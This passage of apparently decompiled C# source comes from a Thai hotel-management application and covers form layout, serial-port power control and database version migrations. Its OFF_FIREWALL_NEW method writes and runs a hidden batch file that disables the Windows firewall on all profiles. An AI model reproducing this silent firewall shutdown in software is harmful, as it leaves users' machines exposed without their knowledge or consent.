		DevComponents.DotNetBar.ElementStyle style2 = this.RibbonTabItemGroup3.Style;
		location = new System.Drawing.Point(1, 1);
		style2.TextShadowOffset = location;
		this.ButtonItem3.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem3.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem3.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem3.Name = "ButtonItem3";
		this.ButtonItem3.OptionGroup = "chart";
		this.ButtonItem3.Text = "ร\u0e31บกล\u0e48อง/ใช\u0e49กล\u0e48อง";
		this.ButtonItem3.Tooltip = "ร\u0e31บกล\u0e48อง/ใช\u0e49กล\u0e48อง";
		this.ButtonItem1.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem1.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem1.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem1.Name = "ButtonItem1";
		this.ButtonItem1.OptionGroup = "chart";
		this.ButtonItem1.Text = "เพ\u0e34\u0e48ม/แก\u0e49ไขแผง";
		this.ButtonItem1.Tooltip = "เพ\u0e34\u0e48ม/แก\u0e49ไขแผง";
		this.ButtonItem22.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem22.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem22.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem22.Name = "ButtonItem22";
		this.ButtonItem22.OptionGroup = "chart";
		this.ButtonItem22.Text = "เพ\u0e34\u0e48ม/แก\u0e49ไขกล\u0e48อง";
		this.ButtonItem22.Tooltip = "เพ\u0e34\u0e48ม/แก\u0e49ไขกล\u0e48อง";
		this.ButtonItem4.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem4.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem4.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem4.Name = "ButtonItem4";
		this.ButtonItem4.OptionGroup = "chart";
		this.ButtonItem4.Text = "ร\u0e31บสต\u0e34\u0e4aกเกอร\u0e4c/ใช\u0e49สต\u0e34\u0e4aกเกอร\u0e4c";
		this.ButtonItem4.Tooltip = "ร\u0e31บสต\u0e34\u0e4aกเกอร\u0e4c/ใช\u0e49สต\u0e34\u0e4aกเกอร\u0e4c";
		this.ButtonItem7.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem7.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem7.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem7.Name = "ButtonItem7";
		this.ButtonItem7.OptionGroup = "chart";
		this.ButtonItem7.Text = "ขยายข\u0e49อม\u0e39ลเต\u0e47มจอ";
		this.ButtonItem7.Tooltip = "ขยายข\u0e49อม\u0e39ลเต\u0e47มจอ";
		this.ButtonItem8.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem8.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem8.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem8.Name = "ButtonItem8";
		this.ButtonItem8.OptionGroup = "chart";
		this.ButtonItem8.Text = "เพ\u0e34\u0e48ม/แก\u0e49ไขสต\u0e34\u0e4aกเกอร\u0e4c";
		this.ButtonItem8.Tooltip = "เพ\u0e34\u0e48ม/แก\u0e49ไขสต\u0e34\u0e4aกเกอร\u0e4c";
		this.ComboItem1.Text = "6";
		this.ComboItem2.Text = "7";
		this.ComboItem3.Text = "8";
		this.ComboItem4.Text = "9";
		this.ComboItem5.Text = "10";
		this.ComboItem6.Text = "11";
		this.ComboItem7.Text = "12";
		this.ButtonItem24.Name = "ButtonItem24";
		this.ButtonItem24.Text = "สร\u0e38ปรายการย\u0e37ม";
		this.ButtonItem25.Name = "ButtonItem25";
		this.ButtonItem25.Text = "สร\u0e38ปรายการย\u0e37ม";
		this.ButtonItem26.Name = "ButtonItem26";
		this.ButtonItem26.Text = "สร\u0e38ปรายการย\u0e37ม";
		this.ButtonItem27.Name = "ButtonItem27";
		this.ButtonItem27.Text = "สร\u0e38ปรายการย\u0e37ม";
		this.Bar1.AccessibleDescription = "Bar1 (Bar1)";
		this.Bar1.AccessibleName = "Bar1";
		this.Bar1.AccessibleRole = System.Windows.Forms.AccessibleRole.ToolBar;
		this.Bar1.AutoHideTabTextAlwaysVisible = true;
		this.Bar1.BarType = DevComponents.DotNetBar.eBarType.StatusBar;
		this.Bar1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Bar1.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Bar1.Items.AddRange(new DevComponents.DotNetBar.BaseItem[7] { this.LabelItem1, this.ButtonItem69, this.ButtonItem36, this.LabelItem4, this.LabelItem3, this.LabelStatus, this.LabelItem2 });
		DevComponents.DotNetBar.Bar bar = this.Bar1;
		location = new System.Drawing.Point(4, 635);
		bar.Location = location;
		this.Bar1.Name = "Bar1";
		DevComponents.DotNetBar.Bar bar2 = this.Bar1;
		size = new System.Drawing.Size(1444, 25);
		bar2.Size = size;
		this.Bar1.Stretch = true;
		this.Bar1.Style = DevComponents.DotNetBar.eDotNetBarStyle.Office2007;
		this.Bar1.TabIndex = 13;
		this.Bar1.TabStop = false;
		this.Bar1.Text = "Bar1";
		this.LabelItem1.Name = "LabelItem1";
		this.ButtonItem69.Image = (System.Drawing.Image)resources.GetObject("ButtonItem69.Image");
		this.ButtonItem69.Name = "ButtonItem69";
		this.ButtonItem69.Text = "ButtonItem36";
		this.ButtonItem69.Tooltip = "โหมดหล\u0e31งบ\u0e49าน";
		this.ButtonItem36.Image = (System.Drawing.Image)resources.GetObject("ButtonItem36.Image");
		this.ButtonItem36.Name = "ButtonItem36";
		this.ButtonItem36.Text = "ButtonItem36";
		this.ButtonItem36.Tooltip = "แสดง Web Browser";
		this.LabelItem4.Name = "LabelItem4";
		this.LabelItem4.Text = "X=0, Y=0";
		this.LabelItem3.Name = "LabelItem3";
		this.LabelItem3.Text = " ";
		this.LabelStatus.ForeColor = System.Drawing.Color.MidnightBlue;
		this.LabelStatus.Name = "LabelStatus";
		this.LabelStatus.Text = "LabelItem2";
		this.LabelItem2.Name = "LabelItem2";
		this.LabelItem2.Text = "  ";
		this.Timer2.Interval = 600000;
		this.StyleManager1.ManagerStyle = DevComponents.DotNetBar.eStyle.Office2007Blue;
		this.ButtonItem2.ButtonStyle = DevComponents.DotNetBar.eButtonStyle.ImageAndText;
		this.ButtonItem2.ColorTable = DevComponents.DotNetBar.eButtonColor.OrangeWithBackground;
		this.ButtonItem2.Enabled = false;
		this.ButtonItem2.ImagePosition = DevComponents.DotNetBar.eImagePosition.Top;
		this.ButtonItem2.Name = "ButtonItem2";
		this.ButtonItem2.OptionGroup = "chart";
		this.ButtonItem2.Text = "เร\u0e35ยกยอดสต\u0e4aอคคงเหล\u0e37อมาจากเด\u0e37อนท\u0e35\u0e48แล\u0e49ว";
		this.ButtonItem2.Tooltip = "เร\u0e35ยกยอดสต\u0e4aอคคงเหล\u0e37อมาจากเด\u0e37อนท\u0e35\u0e48แล\u0e49ว";
		this.PanelEx1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.PanelEx1.CanvasColor = System.Drawing.SystemColors.Control;
		this.PanelEx1.ColorSchemeStyle = DevComponents.DotNetBar.eDotNetBarStyle.StyleManagerControlled;
		this.PanelEx1.Controls.Add(this.Label2);
		this.PanelEx1.Font = new System.Drawing.Font("Tahoma", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 222);
		DevComponents.DotNetBar.PanelEx panelEx = this.PanelEx1;
		location = new System.Drawing.Point(263, 509);
		panelEx.Location = location;
		this.PanelEx1.Name = "PanelEx1";
		DevComponents.DotNetBar.PanelEx panelEx2 = this.PanelEx1;
		size = new System.Drawing.Size(944, 93);
		panelEx2.Size = size;
		this.PanelEx1.Style.Alignment = System.Drawing.StringAlignment.Center;
		this.PanelEx1.Style.BackColor1.Color = System.Drawing.Color.WhiteSmoke;
		this.PanelEx1.Style.BackColor2.Color = System.Drawing.Color.FromArgb(224, 224, 224);
		this.PanelEx1.Style.Border = DevComponents.DotNetBar.eBorderType.SingleLine;
		this.PanelEx1.Style.BorderColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelBorder;
		this.PanelEx1.Style.ForeColor.ColorSchemePart = DevComponents.DotNetBar.eColorSchemePart.PanelText;
		this.PanelEx1.Style.GradientAngle = 90;
		this.PanelEx1.TabIndex = 17;
		this.Label2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.Label2.Font = new System.Drawing.Font("Angsana New", 14.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 222);
		this.Label2.ForeColor = System.Drawing.Color.SteelBlue;
		System.Windows.Forms.Label label = this.Label2;
		location = new System.Drawing.Point(20, 0);
		label.Location = location;
		System.Windows.Forms.Label label2 = this.Label2;
		padding = new System.Windows.Forms.Padding(3, 10, 3, 0);
		label2.Margin = padding;
		this.Label2.Name = "Label2";
		System.Windows.Forms.Label label3 = this.Label2;
		size = new System.Drawing.Size(907, 93);
		label3.Size = size;
		this.Label2.TabIndex = 0;
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Timer1.Interval = 10000;
		this.WebBrowser1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		System.Windows.Forms.WebBrowser webBrowser = this.WebBrowser1;
		location = new System.Drawing.Point(959, 210);
		webBrowser.Location = location;
		System.Windows.Forms.WebBrowser webBrowser2 = this.WebBrowser1;
		size = new System.Drawing.Size(20, 20);
		webBrowser2.MinimumSize = size;
		this.WebBrowser1.Name = "WebBrowser1";
		System.Windows.Forms.WebBrowser webBrowser3 = this.WebBrowser1;
		size = new System.Drawing.Size(484, 351);
		webBrowser3.Size = size;
		this.WebBrowser1.TabIndex = 19;
		this.WebBrowser1.Visible = false;
		this.Label1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.Label1.AutoSize = true;
		System.Windows.Forms.Label label4 = this.Label1;
		location = new System.Drawing.Point(900, 210);
		label4.Location = location;
		this.Label1.Name = "Label1";
		System.Windows.Forms.Label label5 = this.Label1;
		size = new System.Drawing.Size(13, 13);
		label5.Size = size;
		this.Label1.TabIndex = 20;
		this.Label1.Text = "1";
		this.Label1.Visible = false;
		this.URL_ON_OFF.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.URL_ON_OFF.Columns.AddRange(new System.Windows.Forms.ColumnHeader[1] { this.ColumnHeader1 });
		System.Windows.Forms.ListView uRL_ON_OFF = this.URL_ON_OFF;
		location = new System.Drawing.Point(744, 446);
		uRL_ON_OFF.Location = location;
		this.URL_ON_OFF.Name = "URL_ON_OFF";
		System.Windows.Forms.ListView uRL_ON_OFF2 = this.URL_ON_OFF;
		size = new System.Drawing.Size(209, 116);
		uRL_ON_OFF2.Size = size;
		this.URL_ON_OFF.TabIndex = 22;
		this.URL_ON_OFF.UseCompatibleStateImageBehavior = false;
		this.URL_ON_OFF.View = System.Windows.Forms.View.Details;
		this.URL_ON_OFF.Visible = false;
		this.ColumnHeader1.Text = "คำส\u0e31\u0e48ง ป\u0e34ด-เป\u0e34ด ไฟ WEB";
		this.ColumnHeader1.Width = 200;
		this.URL_ON_OFF_SERIALS.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.URL_ON_OFF_SERIALS.Columns.AddRange(new System.Windows.Forms.ColumnHeader[1] { this.ColumnHeader2 });
		System.Windows.Forms.ListView uRL_ON_OFF_SERIALS = this.URL_ON_OFF_SERIALS;
		location = new System.Drawing.Point(519, 446);
		uRL_ON_OFF_SERIALS.Location = location;
		this.URL_ON_OFF_SERIALS.Name = "URL_ON_OFF_SERIALS";
		System.Windows.Forms.ListView uRL_ON_OFF_SERIALS2 = this.URL_ON_OFF_SERIALS;
		size = new System.Drawing.Size(219, 116);
		uRL_ON_OFF_SERIALS2.Size = size;
		this.URL_ON_OFF_SERIALS.TabIndex = 24;
		this.URL_ON_OFF_SERIALS.UseCompatibleStateImageBehavior = false;
		this.URL_ON_OFF_SERIALS.View = System.Windows.Forms.View.Details;
		this.URL_ON_OFF_SERIALS.Visible = false;
		this.ColumnHeader2.Text = "คำส\u0e31\u0e48ง ป\u0e34ด-เป\u0e34ด ไฟ Serials";
		this.ColumnHeader2.Width = 200;
		this.TimerSerials.Interval = 500;
		this.TimerMouse.Interval = 1000;
		this.SerialPort2.PortName = "COM3";
		this.SerialPort2.WriteTimeout = 1000;
		this.TimerNotifly.Interval = 500;
		this.TimerCheckNotify.Interval = 900000;
		this.WebBrowser2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		System.Windows.Forms.WebBrowser webBrowser4 = this.WebBrowser2;
		location = new System.Drawing.Point(744, 333);
		webBrowser4.Location = location;
		System.Windows.Forms.WebBrowser webBrowser5 = this.WebBrowser2;
		size = new System.Drawing.Size(20, 20);
		webBrowser5.MinimumSize = size;
		this.WebBrowser2.Name = "WebBrowser2";
		System.Windows.Forms.WebBrowser webBrowser6 = this.WebBrowser2;
		size = new System.Drawing.Size(209, 108);
		webBrowser6.Size = size;
		this.WebBrowser2.TabIndex = 26;
		this.WebBrowser2.Visible = false;
		this.TimerChkVer.Interval = 8000000;
		this.Label100.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.Label100.BackColor = System.Drawing.Color.White;
		System.Windows.Forms.Label label6 = this.Label100;
		location = new System.Drawing.Point(10, 210);
		label6.Location = location;
		this.Label100.Name = "Label100";
		System.Windows.Forms.Label label7 = this.Label100;
		size = new System.Drawing.Size(503, 351);
		label7.Size = size;
		this.Label100.TabIndex = 28;
		this.Label100.Visible = false;
		this.TimerDate.Interval = 1000;
		this.TimerWeb.Interval = 600000;
		System.Windows.Forms.WebBrowser webBrowserBlock = this.WebBrowserBlock;
		location = new System.Drawing.Point(290, 332);
		webBrowserBlock.Location = location;
		System.Windows.Forms.WebBrowser webBrowserBlock2 = this.WebBrowserBlock;
		size = new System.Drawing.Size(20, 20);
		webBrowserBlock2.MinimumSize = size;
		this.WebBrowserBlock.Name = "WebBrowserBlock";
		this.WebBrowserBlock.ScriptErrorsSuppressed = true;
		System.Windows.Forms.WebBrowser webBrowserBlock3 = this.WebBrowserBlock;
		size = new System.Drawing.Size(219, 108);
		webBrowserBlock3.Size = size;
		this.WebBrowserBlock.TabIndex = 30;
		this.WebBrowserBlock.Visible = false;
		this.Timer_0.Interval = 300123;
		size = new System.Drawing.Size(5, 14);
		this.AutoScaleBaseSize = size;
		this.BackColor = System.Drawing.Color.FromArgb(194, 217, 247);
		this.BottomLeftCornerSize = 0;
		this.BottomRightCornerSize = 0;
		size = new System.Drawing.Size(1452, 662);
		this.ClientSize = size;
		this.Controls.Add(this.WebBrowserBlock);
		this.Controls.Add(this.Label100);
		this.Controls.Add(this.WebBrowser2);
		this.Controls.Add(this.URL_ON_OFF_SERIALS);
		this.Controls.Add(this.URL_ON_OFF);
		this.Controls.Add(this.Label1);
		this.Controls.Add(this.WebBrowser1);
		this.Controls.Add(this.PanelEx1);
		this.Controls.Add(this.Bar1);
		this.Controls.Add(this.tabStrip1);
		this.Controls.Add(this.ribbonControl1);
		this.EnableGlass = false;
		this.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 222);
		this.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		this.IsMdiContainer = true;
		this.Name = "frmMain1";
		this.TopLeftCornerSize = 0;
		this.TopRightCornerSize = 0;
		this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
		this.ribbonControl1.ResumeLayout(false);
		this.ribbonControl1.PerformLayout();
		this.ribbonPanel1.ResumeLayout(false);
		this.RibbonPanel2.ResumeLayout(false);
		this.RibbonPanel6.ResumeLayout(false);
		this.RibbonPanel4.ResumeLayout(false);
		this.RibbonPanel5.ResumeLayout(false);
		this.RibbonPanel7.ResumeLayout(false);
		this.RibbonPanel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.Bar1).EndInit();
		this.PanelEx1.ResumeLayout(false);
		this.ResumeLayout(false);
		this.PerformLayout();
	}

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetCursorPos(ref Point lpPoint);

	public void OFF_FIREWALL_NEW()
	{
		try
		{
			if (Environment.OSVersion.Version.Major >= 6)
			{
				if (!File.Exists(Module1.Path_Program + "firewalloff.bat"))
				{
					StreamWriter streamWriter = new StreamWriter(Module1.Path_Program + "firewalloff.bat");
					streamWriter.Write("NetSh Advfirewall set allprofiles state off");
					streamWriter.Close();
				}
			}
			else if (!File.Exists(Module1.Path_Program + "firewalloffxp.bat"))
			{
				StreamWriter streamWriter2 = new StreamWriter(Module1.Path_Program + "firewalloffxp.bat");
				streamWriter2.Write("netsh firewall set opmode disable");
				streamWriter2.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process process = null;
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			if (Environment.OSVersion.Version.Major >= 6)
			{
				processStartInfo.FileName = Module1.Path_Program + "firewalloff.bat";
			}
			else
			{
				processStartInfo.FileName = Module1.Path_Program + "firewalloffxp.bat";
			}
			processStartInfo.Arguments = "";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = true;
			Process.Start(processStartInfo)?.Dispose();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void Update_Version()
	{
		MyProject.Forms.FormART.Show();
		if (!Directory.Exists(Module1.Path_Program + "reports"))
		{
			try
			{
				Directory.CreateDirectory(Module1.Path_Program + "reports");
				StreamWriter streamWriter = File.CreateText(Module1.Path_Program + "reports\\settings.txt");
				streamWriter.WriteLine("ROWS_SALE_VAT=7");
				streamWriter.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		Application.DoEvents();
		DataSet dataSet = Module1.connect("select * from Tb_Version");
		int num = 0;
		num = (Versioned.IsNumeric(dataSet.Tables[0].Rows[0]["V_NO"].ToString()) ? Conversions.ToInteger(dataSet.Tables[0].Rows[0]["V_NO"]) : 0);
		if (num < 1)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_Products ADD [Pro_Barcode] [varchar](50)");
			Module1.connect("ALTER TABLE HT_Customers Alter Column [Cust_Add_no] [varchar](250)");
			Module1.connect("ALTER TABLE HT_Customers Alter Column [Cust_Work_no] [varchar](250)");
			num = 1;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(1) + "'");
		}
		if (num < 2)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [login_url] [varchar](250)");
			Module1.connect("update TB_SETTINGS set login_url=''");
			num = 2;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(2) + "'");
		}
		if (num < 3)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE HT_Rooms_Price ADD [Room_Price_H] [float]");
			Module1.connect("ALTER TABLE HT_Rooms_Price ADD [Room_Price_M] [float]");
			Module1.connect("update HT_Rooms_Price set Room_Price_H=0 , Room_Price_M=0");
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [Min_HOURS] [float]");
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [AUTO_CUT_POWER] [varchar](10)");
			Module1.connect("update TB_SETTINGS set Min_HOURS=1, AUTO_CUT_POWER='False' ");
			num = 3;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(3) + "'");
		}
		if (num < 4)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [MANUAL_POWER] [varchar](10)");
			Module1.connect("update TB_SETTINGS set MANUAL_POWER='False' ");
			num = 4;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(4) + "'");
		}
		if (num < 5)
		{
			Application.DoEvents();
			Module1.connect("ALTER TABLE TB_SETTINGS ADD [POWER_Delay] [varchar](10)");
			Module1.connect("update TB_SETTINGS set POWER_Delay='500' ");
			num = 5;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(5) + "'");
		}
		if (num < 6)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE TB_FOLIO ([id] [int] NULL,[NO] [varchar](20) COLLATE Thai_CI_AS NULL,[CIN_NAME1] [varchar](255) COLLATE Thai_CI_AS NULL,[CIN_NAME2] [varchar](255) COLLATE Thai_CI_AS NULL,[CIN_NAME3] [varchar](255) COLLATE Thai_CI_AS NULL,[F_ROOM] [varchar](50) COLLATE Thai_CI_AS NULL,[F_NAME] [varchar](250) COLLATE Thai_CI_AS NULL,[F_IN] [varchar](50) COLLATE Thai_CI_AS NULL,[F_OUT] [varchar](50) COLLATE Thai_CI_AS NULL,[F_NIGHT] [varchar](50) COLLATE Thai_CI_AS NULL,[F_PRICE] [varchar](50) COLLATE Thai_CI_AS NULL,[F_PRICE_TOTAL] [varchar](50) COLLATE Thai_CI_AS NULL)");
			num = 6;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(6) + "'");
		}
		if (num < 7)
		{
			Application.DoEvents();
			Module1.connect("CREATE TABLE TB_Pay_History ([id] [int] NULL,[Pay_Date] [float] NULL,[Pay_Bill] [varchar](255) COLLATE Thai_CI_AS NULL,[Pay_Cust] [varchar](500) COLLATE Thai_CI_AS NULL,[Pay_Type] [varchar](50) COLLATE Thai_CI_AS NULL,[Pay_Total] [float] NULL,[Pay_Note] [varchar](500) COLLATE Thai_CI_AS NULL,[Pay_Program] [float] NULL,[Pay_Group] [varchar](50) COLLATE Thai_CI_AS NULL,[Pay_Account] [varchar](50) COLLATE Thai_CI_AS NULL)");
			Module1.connect("CREATE TABLE TB_SET_MyType2 ([id] [int] IDENTITY(1,1) NOT NULL,[id_full] [varchar](50) COLLATE Thai_CI_AS NULL,[name] [varchar](100) COLLATE Thai_CI_AS NULL)");
			Module1.connect("CREATE TABLE TB_SET_MyType2_2 ([id] [int] IDENTITY(1,1) NOT NULL,[id_full] [varchar](50) COLLATE Thai_CI_AS NULL,[name] [varchar](100) COLLATE Thai_CI_AS NULL)");
			Module1.connect("CREATE TABLE TB_SET_MyType3 ([id] [int] IDENTITY(1,1) NOT NULL,[id_full] [varchar](50) COLLATE Thai_CI_AS NULL,[name] [varchar](100) COLLATE Thai_CI_AS NULL)");
			Module1.connect("INSERT INTO TB_SET_MyType2 (id_full,name) VALUES ('1','ส\u0e34นทร\u0e31พย\u0e4c')");
			Module1.connect("INSERT INTO TB_SET_MyType2 (id_full,name) VALUES ('2','หน\u0e35\u0e49ส\u0e34น')");
			Module1.connect("INSERT INTO TB_SET_MyType2 (id_full,name) VALUES ('3','ท\u0e38น')");
			Module1.connect("INSERT INTO TB_SET_MyType2 (id_full,name) VALUES ('4','รายได\u0e49')");
			Module1.connect("INSERT INTO TB_SET_MyType2 (id_full,name) VALUES ('5','ค\u0e48าใช\u0e49จ\u0e48าย')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('101','ส\u0e34นทร\u0e31พย\u0e4cหม\u0e38นเว\u0e35ยน')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10101','เง\u0e34นสด')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('102','เง\u0e34นฝากธนาคาร')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10201','เง\u0e34นฝาก-ออมทร\u0e31พย\u0e4c/เผ\u0e37\u0e48อเร\u0e35ยก')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10202','เง\u0e34นฝาก-ประจำ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10203','เง\u0e34นฝาก-กระแสรายว\u0e31น')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('103','ล\u0e39กหน\u0e35\u0e49')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10301','ล\u0e39กหน\u0e35\u0e49อ\u0e37\u0e48นๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('104','ส\u0e34นทร\u0e31พย\u0e4cอ\u0e37\u0e48นๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10401','พ\u0e31นธบ\u0e31ตร/ห\u0e38\u0e49น')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('105','ท\u0e35\u0e48ด\u0e34น อาคาร และอ\u0e38ปกรณ\u0e4c (ส\u0e34นทร\u0e31พย\u0e4cถาวร)')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10501','ท\u0e35\u0e48ด\u0e34น')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10502','อาคารและส\u0e34\u0e48งก\u0e48อสร\u0e49าง')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10503','เคร\u0e37\u0e48องจ\u0e31กรและยานพาหนะ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10504','คร\u0e38ภ\u0e31ณฑ\u0e4cสำน\u0e31กงาน')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10505','คร\u0e38ภ\u0e31ณฑ\u0e4cคอมพ\u0e34วเตอร\u0e4c')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('106','รายจ\u0e48ายจ\u0e48ายล\u0e48วงหน\u0e49า')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10601','งบกลางจ\u0e48ายล\u0e48วงหน\u0e49า')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('10602','ค\u0e48าตอบแทนจ\u0e48ายล\u0e48วงหน\u0e49า')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('201','หน\u0e35\u0e49ส\u0e34นระยะส\u0e31\u0e49น')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20101','เจ\u0e49าหน\u0e35\u0e49ผ\u0e39\u0e49ร\u0e31บจ\u0e49าง')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('202','รายจ\u0e48ายค\u0e49างจ\u0e48าย')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20201','รายจ\u0e48ายค\u0e49างจ\u0e48าย')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('203','หน\u0e35\u0e49ส\u0e34นระยะยาว')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20301','หน\u0e35\u0e49ส\u0e34นระยะยาว')");
			Module1.connect("INSERT INTO TB_SET_MyType2_2 (id_full,name) VALUES ('204','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20401','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49อ\u0e37\u0e48น ๆ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20402','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.กร\u0e38งไทย')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20403','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.กร\u0e38งเทพ')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20404','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.กส\u0e34กรไทย')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20405','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.ไทยพาน\u0e34ช')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20406','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.กร\u0e38งศร\u0e35')");
			Module1.connect("INSERT INTO TB_SET_MyType3 (id_full,name) VALUES ('20407','เจ\u0e49าหน\u0e35\u0e49เง\u0e34นก\u0e39\u0e49 ธ.ออมส\u0e34น')");
